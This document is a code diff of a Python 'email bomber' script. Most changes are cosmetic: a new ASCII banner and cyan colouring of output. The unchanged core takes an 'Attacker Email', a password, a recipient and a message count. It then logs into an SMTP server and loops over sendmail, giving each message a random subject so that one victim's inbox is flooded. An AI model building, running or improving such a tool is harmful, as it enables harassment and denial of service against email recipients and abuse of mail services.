@@ -14,36 +14,23 @@ if platform.system() == 'Windows':
 else:
     os.system('clear')
 
+art = '[bold cyan]     ░█▀▀░█▄█░█▀█░▀█▀░█░░░░░█▀▄░█▀█░█▄█░█▀▄░█▀▀░█▀▄\n     ░█▀▀░█░█░█▀█░░█░░█░░░░░█▀▄░█░█░█░█░█▀▄░█▀▀░█▀▄\n     ░▀▀▀░▀░▀░▀░▀░▀▀▀░▀▀▀░░░▀▀░░▀▀▀░▀░▀░▀▀░░▀▀▀░▀░▀'
 
 def mail():
-    print('[bold red]--------------------------------------------------------------------[bold red]')
-    print('[bold red]*                                                                  *[bold red]')
-    print('[bold red]*                                                                  *[bold red]')
-    print('[bold red]*               ______                   _                         *[/bold red]')
-    print('[bold red]*              |  ____|               (_) |                        *[/bold red]')
-    print('[bold red]*              | |__   _ __ ___   __ _ _| |                        *[/bold red]')
-    print("[bold red]*              |  __| | '_ ` _ \ / _` | | |                        *[/bold red]")
-    print('[bold red]*              | |____| | | | | | (_| | | |                        *[/bold red]')
-    print('[bold red]*              |______|_| |_| |_|\__,_|_|_|                        *[/bold red]')
-    print('[bold red]*               ____                  _                            *[/bold red]')
-    print('[bold red]*              |  _ \                | |                           *[/bold red]')
-    print('[bold red]*              | |_) | ___  _ __ ___ | |__   ___ _ __              *[/bold red]')
-    print("[bold red]*              |  _ < / _ \| '_ ` _ \| '_ \ / _ \ '__|             *[/bold red]")
-    print('[bold red]*              | |_) | (_) | | | | | | |_) |  __/ |                *[/bold red]')
-    print('[bold red]*              |____/ \___/|_| |_| |_|_.__/ \___|_|                *[/bold red]')
-    print('[bold red]*                                                                  *[/bold red]')
-    print('[bold red]--------------------------------------------------------------------[/bold red]')
-    print('\n\n')
+    print('\n')
+    print(art)
+    print('\n')
+    print('[bold cyan]     ______________________________________________')
 
-    user = input('Name: ')
-    email = input('\nAttacker Email: ')
-    password = getpass('\nAttacker Password: ')
-    to = input('\nRecipient Email: ')
+    user = input('\n Name: ')
+    email = input('\n Attacker Email: ')
+    password = getpass('\n Attacker Password: ')
+    to = input('\n Recipient Email: ')
     # subject = input('\nSubject: ')
-    mssg = MIMEText(input('\nMessage: '))
-    number = input('\nNumber of Emails: ')
-    smtp = input('\nSMTP Server (smtp.(your_input).com): ')
-    port = input('\nPort: ')
+    mssg = MIMEText(input('\n Message: '))
+    number = input('\n Number of Emails: ')
+    smtp = input('\n SMTP Server (smtp.(your_input).com): ')
+    port = input('\n Port: ')
     stmp = 'smtp.' + smtp + '.com'
 
     try:
@@ -51,25 +38,25 @@ def mail():
         server.ehlo()
         server.starttls()
         server.login(email, password)
-        for i in track(range(1, int(number)+1), description="[red]Bombing..."):
+        for i in track(range(1, int(number)+1), description="[bold cyan] Bombing..."):
             subject = secrets.token_hex(5)
             msg = f'From: {user}\nSubject: {subject}\nMessage: {mssg}'
             server.sendmail(email, to, msg)
-            print("[red]\rE-mails sent: %i" % i)
             sleep(1)
             sys.stdout.flush()
         server.quit()
-        print('[red]\nEmails have been sent!')
+        print('[bold cyan]\n Bomb Completed!')
+        print('[bold cyan]\n E-mails sent: %i' % i)
         sys.exit()
 
     except KeyboardInterrupt:
-        print('\n[-] Canceled')
+        print('\n[bold red] [-] Bombing Interrupted')
         sys.exit()
 
     except smtplib.SMTPAuthenticationError:
-        print('\n[!] The username or password you entered was not accepted')
+        print('\n[bold red] [!] The username or password you entered was not accepted')
         sys.exit()
 
     except smtplib.SMTPConnectError:
-        print("\n[!] Couldn't connect to the SMTP server")
+        print("\n[bold red] [!] Couldn't connect to the SMTP server")
         sys.exit()
